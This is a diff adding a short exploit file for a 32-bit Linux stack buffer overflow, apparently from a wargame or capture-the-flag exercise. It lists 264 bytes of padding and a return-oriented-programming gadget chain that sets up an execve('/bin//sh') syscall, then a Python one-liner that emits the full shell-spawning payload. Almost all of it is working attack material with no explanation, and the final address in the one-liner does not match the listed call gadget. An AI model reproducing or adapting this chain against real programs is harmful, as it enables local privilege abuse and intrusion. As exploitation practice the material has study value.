@@ -1,0 +1,13 @@
+"A"*264
+
++ 0xb7f1da81	pop edx ; pop ecx ; pop ebx ;ret
++ 0xbffff10c
++ 0xbffff10c
++ 0xbffff104	pointer of string "/bin//sh"
++ 0xb7e9e59f	xor eax eax ; ret ;;
++ 0xb7f693e6	add eax 0xb ;ret
++ 0xb7ed9c25	call dword [gs:0x10] ;ret
+
+
+`python -c 'print "/bin//sh0000"+"A"*252+"\x81\xda\xf1\xb7"+"\x0c\xf1\xff\xbf"+"\x0c\xf1\xff\xbf"+"\x04\xf1\xff\xbf"+"\x9f\xe5\xe9\xb7"+"\xe6\x93\xf6\xb7"+"\xb0\xf1\xfd\xb7"'`
+
